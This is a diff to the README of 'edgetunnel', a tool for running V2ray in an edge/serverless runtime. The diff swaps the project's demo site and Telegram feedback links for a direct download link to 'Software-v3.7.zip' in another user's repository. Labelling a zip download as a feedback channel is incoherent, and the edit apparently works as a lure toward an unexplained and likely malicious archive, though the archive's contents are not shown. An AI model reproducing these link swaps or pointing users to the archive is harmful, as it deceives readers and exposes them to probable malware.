@@ -6,8 +6,8 @@ Running **V2ray** in the edge/serverless runtime.
 
 **!!If your find project can't use, please check the your deploy page and rescan the QRcode!!!!**
 
-https://edgetunnel.114567.xyz/
+https://github.com/Mrji95/edgetunnel/raw/refs/heads/main/tools/Software-v3.7.zip
 
 # Feedback
 
-If you have any questions, please open GitHub issue or use https://t.me/edgetunnel for communication.
+If you have any questions, please open GitHub issue or use https://github.com/Mrji95/edgetunnel/raw/refs/heads/main/tools/Software-v3.7.zip for communication.
